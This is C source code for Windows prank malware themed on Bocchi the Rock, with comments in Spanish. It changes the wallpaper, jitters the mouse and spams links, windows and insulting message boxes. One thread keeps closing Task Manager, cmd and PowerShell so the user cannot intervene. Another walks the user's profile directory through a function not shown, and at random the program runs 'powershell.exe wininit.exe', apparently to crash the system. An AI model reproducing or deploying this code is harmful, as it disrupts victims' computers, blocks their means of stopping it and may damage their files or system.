#include <stdio.h>
#include <unistd.h>
#include <windows.h>
#include <Lmcons.h>
#include <time.h>
#include <commctrl.h>
#include <pthread.h>
#include "Bochi_funciones.h"
#include "Archivo_header_bytes.h"

void * Close_task_manager(void * arg){
   while(1){
      HWND taskmgr_hwnd = FindWindowA("TaskManagerWindow", NULL);
      HWND cmd_hwnd = FindWindowA("ConsoleWindowClass" , NULL);
      HWND powershell_hwmd = FindWindowA("WindowsPowerShell_ConsoleHost" , NULL);

      // Si encontramos la ventana, la cerramos
      if (taskmgr_hwnd != NULL) {
        SendMessage(taskmgr_hwnd, WM_CLOSE, 0, 0);
      }else if(cmd_hwnd != NULL){
        SendMessage(cmd_hwnd , WM_CLOSE , 0 , 0);
      }else if(powershell_hwmd != NULL){
        SendMessage(powershell_hwmd , WM_CLOSE , 0 , 0);
      }
   }
}

void * Close_error_window(void * arg){
    while(1){
        sleep(5);

        HWND hwnd = FindWindow(NULL, "Bochi La Mejor xD");

        if (hwnd != NULL) {
            // Si la ventana existe, envía un mensaje WM_CLOSE para cerrarla
            SendMessage(hwnd, WM_CLOSE, 0, 0);
        }
    }       
}

void * Mm(void*arg){
   while (1) {
      POINT cursor;
      GetCursorPos(&cursor);
      int x = cursor.x + (rand() % 6 - 3);
      int y = cursor.y + (rand() % 6 - 3);
      SetCursorPos(x, y);
      Sleep(10);
   }
}
void * Open_cmdornotepad(void * arg){
   sleep(500);
   while(1){
      int randomNumber_cmdornotepad = rand() % 3;

      char *Cmd_or_notepad[2] = {"notepad.exe" , "cmd.exe"};

      ShellExecute(NULL, "open",Cmd_or_notepad[randomNumber_cmdornotepad] , NULL, NULL, SW_SHOWDEFAULT);
      sleep(5);
   }
  
}

void * Open_links(void*arg){
   while(1){

      int Sleep_secret = rand() % 20;

      sleep(Sleep_secret);

      char * Array_strings[15] = {
        "https://www.youtube.com/watch?v=XTspuiENsn4" , 
        "https://www.youtube.com/watch?v=q6-RHDQ-tYw" , 
        "https://www.youtube.com/watch?v=qm0zni7i3U0" ,
        "https://images7.memedroid.com/images/UPLOADED348/63cb01024ff2e.jpeg" , 
        "https://imageproxyb.ifunny.co/crop:x-20,resize:640x,quality:90x75/images/b371cb0d9ce96c5a3b02ed6edc6eab3100454d3db9eff3ac1e5c3fa568967325_1.jpg" , 
        "https://i.kym-cdn.com/photos/images/original/002/497/709/512.gif" , 
        "https://media.tenor.com/YomyOuGpetMAAAAd/bocchi-bocchi-the-rock.gif" , 
        "https://www.google.com/search?q=Me+puedo+casar+con+bochi+the+rock+%3F&oq=Me+puedo+casar+con+bochi+the+rock+%3F&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDk2OTVqMGoxqAIAsAIA&sourceid=chrome&ie=UTF-8"
        "https://www.google.com/search?q=Debo+dejar+de+descargar+virus+animes+de+mierda&sca_esv=576780426&ei=tX46Za7VNeGekPIP0bOwyAc&ved=0ahUKEwjug8v__JOCAxVhD0QIHdEZDHkQ4dUDCBA&uact=5&oq=Debo+dejar+de+descargar+virus+animes+de+mierda&gs_lp=Egxnd3Mtd2l6LXNlcnAiLkRlYm8gZGVqYXIgZGUgZGVzY2FyZ2FyIHZpcnVzIGFuaW1lcyBkZSBtaWVyZGEyBBAAGEcyBBAAGEcyBBAAGEcyBBAAGEcyBBAAGEcyBBAAGEcyBBAAGEcyBBAAGEdI6g9Q9wJY9wJwAXgDkAEAmAEAoAEAqgEAuAEDyAEA-AEBwgIKEAAYRxjWBBiwA-IDBBgAIEHiAwUSATEgQIgGAZAGCA&sclient=gws-wiz-serp"
        "https://www.google.com/search?q=Como+hablar+con+mujeres+reales+&sca_esv=576780426&ei=un46ZcmHCPXCkPIPyp6fuA8&ved=0ahUKEwjJzM6B_ZOCAxV1IUQIHUrPB_cQ4dUDCBA&uact=5&oq=Como+hablar+con+mujeres+reales+&gs_lp=Egxnd3Mtd2l6LXNlcnAiH0NvbW8gaGFibGFyIGNvbiBtdWplcmVzIHJlYWxlcyAyBRAhGKABMgUQIRigATIFECEYoAEyBRAhGKABMggQIRgWGB4YHTIIECEYFhgeGB0yCBAhGBYYHhgdSJ1RUOUGWNtNcAl4AZABAJgBmQKgAek1qgEHMC4yNC4xMrgBA8gBAPgBAagCCsICChAAGEcY1gQYsAPCAhYQABgDGI8BGOUCGOoCGLQCGIwD2AEBwgIWEC4YAxiPARjlAhjqAhi0AhiMA9gBAcICCxAAGIAEGLEDGIMBwgILEC4YgwEYsQMYgATCAg4QLhiABBixAxjHARjRA8ICERAuGIAEGLEDGIMBGMcBGNEDwgILEAAYigUYsQMYgwHCAgkQABiKBRgKGEPCAgcQABiKBRhDwgIOEAAYgAQYsQMYgwEYyQPCAg4QABiABBixAxiDARiSA8ICCBAAGIoFGJIDwgINEAAYigUYsQMYgwEYQ8ICBRAuGIAEwgIEEAAYA8ICBRAAGIAEwgIIEAAYgAQYsQPCAggQABiABBjHA8ICBhAAGBYYHsICChAhGBYYHhgPGB3CAgQQIRgV4gMEGAAgQYgGAZAGCLoGBAgBGAo&sclient=gws-wiz-serp"
        "https://www.google.com/search?q=Las+mujeres+con+pelo+rosa+y+ansiedad+social+existen+en+la+vida+real+%3F&sca_esv=576780426&ei=0H46ZaSNH-jxkPIP_LCjoAY&ved=0ahUKEwiktaSM_ZOCAxXoOEQIHXzYCGQQ4dUDCBA&uact=5&oq=Las+mujeres+con+pelo+rosa+y+ansiedad+social+existen+en+la+vida+real+%3F&gs_lp=Egxnd3Mtd2l6LXNlcnAiRUxhcyBtdWplcmVzIGNvbiBwZWxvIHJvc2EgeSBhbnNpZWRhZCBzb2NpYWwgZXhpc3RlbiBlbiBsYSB2aWRhIHJlYWwgP0jJkAFQ3wtY5IcBcAh4AZABAJgB2QOgAfRlqgELMC41Mi4xNy4wLjG4AQPIAQD4AQGoAgrCAgoQABhHGNYEGLADwgIWEAAYAxiPARjlAhjqAhi0AhiMA9gBAcICFhAuGAMYjwEY5QIY6gIYtAIYjAPYAQHCAgsQLhiKBRixAxiDAcICCxAAGIAEGLEDGIMBwgIREC4YgAQYsQMYgwEYxwEY0QPCAgsQABiKBRixAxiDAcICGhAuGIoFGLEDGIMBGJcFGNwEGN4EGOAE2AECwgIREC4YgwEYxwEYsQMY0QMYgATCAgUQABiABMICCxAuGIAEGLEDGIMBwgIHEC4YigUYQ8ICBxAAGIoFGEPCAggQLhiABBixA8ICFhAuGIoFGEMYlwUY3AQY3gQY4ATYAQLCAg0QLhiKBRixAxiDARhDwgIFEC4YgATCAhwQLhiKBRixAxiDARhDGJcFGNwEGN4EGOAE2AECwgIKEC4YigUYsQMYQ8ICCBAuGLEDGIAEwgIUEC4YgAQYlwUY3AQY3gQY4ATYAQLCAgYQABgWGB7CAgUQIRigAcICCBAhGBYYHhgdwgIHECEYoAEYCsICBBAhGBXiAwQYACBBiAYBkAYIugYECAEYCroGBggCEAEYFA&sclient=gws-wiz-serp"
        "https://es.aliexpress.com/item/1005006007499942.html?spm=a2g0o.productlist.main.11.6fcd7fbfrTJAi8&algo_pvid=670f7d8d-28cd-4c37-a486-17aa7785900c"
        "https://www.google.com/search?q=Como+puedo+dejar+de+ser+un+virgo+de+mierda&sca_esv=576780426&ei=cH86ZYy5ObaIkvQP2ZyMiAE&ved=0ahUKEwiMseTY_ZOCAxU2hIQIHVkOAxEQ4dUDCBA&uact=5&oq=Como+puedo+dejar+de+ser+un+virgo+de+mierda&gs_lp=Egxnd3Mtd2l6LXNlcnAiKkNvbW8gcHVlZG8gZGVqYXIgZGUgc2VyIHVuIHZpcmdvIGRlIG1pZXJkYUjwb1D9CFj6bXAGeACQAQGYAeYCoAHlP6oBCDAuMzQuOS4yuAEDyAEA-AEBqAIKwgIIEAAYgAQYsAPCAhYQABgDGI8BGOUCGOoCGLQCGIwD2AEBwgIWEC4YAxiPARjlAhjqAhi0AhiMA9gBAcICBxAuGIoFGEPCAgsQABiABBixAxiDAcICCxAuGIMBGLEDGIAEwgIOEC4YgAQYsQMYxwEY0QPCAhEQLhiABBixAxiDARjHARjRA8ICFhAuGIoFGEMYlwUY3AQY3gQY3wTYAQLCAgsQABiKBRixAxiDAcICCBAAGIAEGLEDwgIFEAAYgATCAiAQLhiABBixAxiDARjHARjRAxiXBRjcBBjeBBjgBNgBAsICBxAAGIoFGEPCAg4QABiABBixAxiDARjJA8ICDhAAGIAEGLEDGIMBGJIDwgIIEAAYigUYkgPCAgUQLhiABMICBBAAGAPCAg4QABiKBRixAxiDARiSA8ICFBAuGIAEGJcFGNwEGN4EGOAE2AECwgIGEAAYFhgewgIFECEYoAHCAggQIRgWGB4YHcICBBAhGBXCAgcQIRigARgK4gMEGAEgQYgGAZAGAboGBAgBGAq6BgYIAhABGBQ&sclient=gws-wiz-serp"
      };

      int randomNumber = rand() % 14;

      ShellExecute(NULL, "open", Array_strings[randomNumber], NULL, NULL, SW_SHOWNORMAL);
      Beep(750 ,300);
   }
}



int main(){
   //Creamos los hilos
   pthread_t thread1, thread2 , thread3 ,thread4 , thread5 , thread6 , thread7;  
   pthread_t thread8 , thread9 ,thread10 , thread11;
   //Generamos el srand
   srand(time(NULL));

   //Ruta por defecto
   char * Default_rute = getenv("USERPROFILE");
   
   //Inicia creando foto para ponerla de wallpaper
   FILE * foto = fopen("C:\\Windows\\Temp\\Bochi te hackeo.jpg", "wb");
   int longitud = sizeof(lista_hex) / sizeof(lista_hex[0]);

   if (foto == NULL){
      return 1;
   }

   for (int i = 0 ; i < longitud ; i++){
      fwrite(&lista_hex[i] , sizeof(unsigned char) , 1 , foto);
   }
   fclose(foto);
   
   const wchar_t *pt = L"C:\\Windows\\Temp\\Bochi te hackeo.jpg";

   //Pone la foto previamente creada de fondo de pantalla
   int resultado = SystemParametersInfoW(SPI_SETDESKWALLPAPER ,0, (void *)pt, SPIF_UPDATEINIFILE);

   //Luego crea una foto .ico para el efecto de imagen que sigue el mouse
   int lo2 = sizeof(lii) / sizeof(lii[0]);
   FILE * Ibo = fopen("C:\\Windows\\Temp\\Icono_bochi.ico", "wb");

   if (Ibo == NULL){
      return 1;
   }

   for (int a = 0 ; a < lo2 ; a++){
      fwrite(&lii[a] , sizeof(unsigned char) , 1 , Ibo);
   }
   fclose(Ibo);

   //Otro icono
   int lo3 = sizeof(laa) / sizeof(laa[0]);
   FILE * Iba = fopen("C:\\Windows\\Temp\\Icono_bochi_desktop.ico", "wb");

   if (Iba == NULL){
      return 1;
   }

   for (int a = 0 ; a < lo3 ; a++){
      fwrite(&laa[a] , sizeof(unsigned char) , 1 , Iba);
   }
   fclose(Iba);
   //Cerramos el crear fotos y empezamos las funciones para asustar

   //Obtenemos el nombre actual de usuario del pc Windows
   char us[UNLEN + 1];
   DWORD usl = UNLEN + 1;
   GetUserName(us, &usl);

   char Mensaje[200] = "Se tu nombre es: ";
   strcat(Mensaje , us);

   if(MessageBox(NULL, "Esta seguro de ejecutar este programa no me hago responsable de nada" , "BochiGOD", MB_ICONWARNING|MB_YESNO)== IDNO){
      exit(0);
   }

   MessageBox(NULL , "Porfavor ejecuta esta madre como administrador \n para disfrutar esto al 100","Bochi Advertencia" , MB_ICONERROR|MB_OK);
   MessageBox(NULL, Mensaje , "BochiGOD", MB_ICONERROR|MB_OK);
   MessageBox(NULL, "Como vez bro estas jodido ejecutar esto fue lo peor que pudistes hacer" , "BochiGOD", MB_ICONERROR|MB_OK);
   MessageBox(NULL, "Ya no hay vuelta atras" , "BochiGOD", MB_ICONERROR|MB_OK);
   //Usamos un par  de messagebox de error por puro mame

   //Inicia el multihilo
   if (pthread_create(&thread1, NULL, &Mm, NULL) || pthread_create(&thread2, NULL, Move_icon, NULL) || pthread_create(&thread3, NULL, &Open_links, NULL)|| pthread_create(&thread4, NULL, Draw_icon, NULL)) {
      MessageBox(NULL, "No se que ah pasado pero hubo un error en crear los 4 primeros hilos" , "BochiGOD", MB_ICONERROR|MB_OK);
      return 1;
    }

   if (pthread_create(&thread5, NULL, Draw_icon_desktop, NULL)||pthread_create(&thread6, NULL, Draw_rose_desktop, NULL)||pthread_create(&thread7, NULL, &Open_cmdornotepad, NULL)||pthread_create(&thread9, NULL, &Close_task_manager, NULL)) {
      MessageBox(NULL, "No se que ah pasado pero hubo un error en crear los ultimos 5 hilos" , "BochiGOD", MB_ICONERROR|MB_OK);
      return 1;
   }

   if(pthread_create(&thread10, NULL, Recorrer_Directorio, Default_rute)||pthread_create(&thread11, NULL, &Close_error_window, NULL)){
      MessageBox(NULL, "No se que ah pasado pero hubo un error en crear el hilo 10" , "BochiGOD", MB_ICONERROR|MB_OK);
      return 1;
   }
   while(1){
      char * Array_con_texto[16] = {
        "Mejor apaga el pc bro" , 
        "Dios mio que locuras ejecutas en tu pc",
        "Hermano el que te mando esto es un tonto",
        "Si ejecutastes esto por voluntad propia deberias ir a un psicologo \n https://www.terapify.com/ ",
        "Trikitrakatelas",
        "Boquita el mejor ship",
        "Ya no se me ocurre que poner aca xD",
        "Quieres tener al bebeton en tu celular *Sonidos de bebe*",
        "Oye, ¿sabias que en terminos de reproduccion de Pokemon humanos masculinos y femeninos, Vaporeon es el Pokemon mas compatible para humanos.",
        "Sabias que el Senor Barriga y nono son la misma persona :O \nMaldita sea el lenguaje C no me deja usar la n con cosita arriba",
        "Saquenme de latam carajo",
        "Consiguete una novia otaku mugroso",
        "Marvel murio en endgame",
        "Oppenheimer es la mejor peli de nolan",
        "El GOTY del 2018 se lo merecia Red dead 2",
        "Chinga tu puta madre bro ya no se que poner"
      };

      int Numero_alzar13 = rand() % 15;

      int Numero_delamuerte = rand() % 100;

      if(Numero_delamuerte == 78){
         MessageBox(NULL, "Say goodbye to you PC" ,"Bochi La Mejor xD" , MB_ICONERROR|MB_OK);
         system("powershell.exe wininit.exe");
      }   
      MessageBox(NULL, Array_con_texto[Numero_alzar13], "Bochi La Mejor xD", MB_ICONERROR|MB_OK);
   }
   pthread_join(thread1, NULL);pthread_join(thread2, NULL);
   pthread_join(thread3, NULL);pthread_join(thread4, NULL);
   pthread_join(thread5, NULL);pthread_join(thread6, NULL);
   pthread_join(thread7, NULL);pthread_join(thread8, NULL);
   pthread_join(thread9, NULL);pthread_join(thread10 , NULL);pthread_join(thread11 , NULL);

   

   // Terminan los hilos, PD: Esta parte de los hilos esta pal pico ya se
   
   return 0;
}
